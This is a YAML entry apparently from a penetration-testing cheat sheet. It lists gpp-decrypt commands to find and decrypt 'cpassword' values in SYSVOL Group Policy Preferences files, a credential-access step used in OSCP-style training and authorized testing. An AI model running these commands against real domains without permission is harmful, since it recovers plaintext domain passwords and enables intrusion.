---
variants:
  - label: decrypt
    command: |
      gpp-decrypt '$CPASSWORD'
  - label: hunt-sysvol
    command: |
      grep -ril cpassword /mnt/sysvol
      gpp-decrypt '$CPASSWORD'
description: Decrypt a cpassword value pulled from a SYSVOL Group Policy Preferences XML file
os: [Linux]
category: [oscp, cli]
service: [SMB, AD]
phase: [CredAccess]
references:
  - https://www.kali.org/tools/gpp-decrypt/
---
